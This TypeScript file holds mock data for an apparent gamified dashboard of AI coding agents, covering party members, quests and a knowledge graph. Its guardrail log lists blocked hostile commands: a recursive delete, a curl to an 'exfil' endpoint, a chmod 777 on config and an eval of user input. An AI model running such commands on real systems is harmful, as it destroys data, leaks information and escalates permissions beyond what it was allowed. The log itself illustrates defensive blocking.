import { GameState, GraphData } from "./types";

export const mockGameState: GameState = {
  system_status: "OPERATIONAL",
  daily_budget: { max: 10.0, spent: 2.5, unit: "USD" },
  party: [
    {
      id: "pm-01",
      name: "Jules-PM",
      class: "Bard",
      stats: { hp: 100, mana: 80, success_rate: "95%" },
      current_action: "Translating Trello scroll to OpenSpec...",
      location: "Requirements Hall",
    },
    {
      id: "arch-01",
      name: "Merlin-Arch",
      class: "Wizard",
      stats: { hp: 90, mana: 60, success_rate: "88%" },
      current_action: "Generating system architecture diagram...",
      location: "Design Sanctum",
    },
    {
      id: "dev-01",
      name: "Blade-Dev",
      class: "Warrior",
      stats: { hp: 75, mana: 45, success_rate: "92%" },
      current_action: "Implementing FastAPI endpoint /api/v1/agents...",
      location: "Code Forge",
    },
    {
      id: "rev-01",
      name: "Aegis-Rev",
      class: "Paladin",
      stats: { hp: 100, mana: 70, success_rate: "99%" },
      current_action: "Reviewing PR #42 — security audit pass...",
      location: "Review Chamber",
    },
  ],
  active_quests: [
    { id: "q1", title: "FastAPI Refactor", stage: "Design", difficulty: "Hard", assigned_agent: "Merlin-Arch" },
    { id: "q2", title: "Auth Module", stage: "In Progress", difficulty: "Legendary", assigned_agent: "Blade-Dev" },
    { id: "q3", title: "Dashboard UI", stage: "Todo", difficulty: "Medium", assigned_agent: "Blade-Dev" },
    { id: "q4", title: "User Stories Sprint 4", stage: "Requirements", difficulty: "Easy", assigned_agent: "Jules-PM" },
    { id: "q5", title: "Code Review Pipeline", stage: "In Progress", difficulty: "Medium", assigned_agent: "Aegis-Rev" },
    { id: "q6", title: "API Rate Limiting", stage: "Todo", difficulty: "Hard" },
  ],
  guardrail_log: [
    { id: "g1", timestamp: "14:32:01", blocked_command: "rm -rf /var/data/*", reason: "NIST AC-6: Destructive filesystem operation blocked", severity: "CRITICAL" },
    { id: "g2", timestamp: "14:31:45", blocked_command: "curl external-api.io/exfil", reason: "NIST SC-7: Unauthorized outbound connection", severity: "HIGH" },
    { id: "g3", timestamp: "14:30:12", blocked_command: "sudo chmod 777 /etc/config", reason: "NIST AC-3: Permission escalation denied", severity: "HIGH" },
    { id: "g4", timestamp: "14:28:55", blocked_command: "eval(user_input)", reason: "NIST SI-10: Unsafe code execution blocked", severity: "MEDIUM" },
  ],
};

export const mockGraphData: GraphData = {
  elements: {
    nodes: [
      { data: { id: "n1", label: "FastAPI", type: "framework", active: true, triples: [{ subject: "FastAPI", predicate: "is_a", object: "Web Framework" }, { subject: "FastAPI", predicate: "uses", object: "Python 3.11" }] } },
      { data: { id: "n2", label: "Auth Module", type: "module", active: true, triples: [{ subject: "Auth Module", predicate: "implements", object: "JWT Auth" }] } },
      { data: { id: "n3", label: "PostgreSQL", type: "database", triples: [{ subject: "PostgreSQL", predicate: "stores", object: "Agent State" }] } },
      { data: { id: "n4", label: "Agent Swarm", type: "system", active: true, triples: [{ subject: "Agent Swarm", predicate: "orchestrates", object: "4 Agents" }] } },
      { data: { id: "n5", label: "Trello API", type: "integration", triples: [{ subject: "Trello API", predicate: "provides", object: "Quest Data" }] } },
      { data: { id: "n6", label: "NIST Framework", type: "security", triples: [{ subject: "NIST", predicate: "enforces", object: "Guardrails" }] } },
      { data: { id: "n7", label: "Knowledge Graph", type: "system", triples: [{ subject: "Knowledge Graph", predicate: "contains", object: "Semantic Triples" }] } },
      { data: { id: "n8", label: "Redis Cache", type: "infrastructure", triples: [{ subject: "Redis", predicate: "caches", object: "Session Data" }] } },
    ],
    edges: [
      { data: { id: "e1", source: "n1", target: "n2", label: "authenticates" } },
      { data: { id: "e2", source: "n1", target: "n3", label: "persists" } },
      { data: { id: "e3", source: "n4", target: "n1", label: "communicates" } },
      { data: { id: "e4", source: "n4", target: "n5", label: "syncs" } },
      { data: { id: "e5", source: "n6", target: "n4", label: "governs" } },
      { data: { id: "e6", source: "n4", target: "n7", label: "populates" } },
      { data: { id: "e7", source: "n7", target: "n3", label: "stored_in" } },
      { data: { id: "e8", source: "n1", target: "n8", label: "caches_via" } },
    ],
  },
};
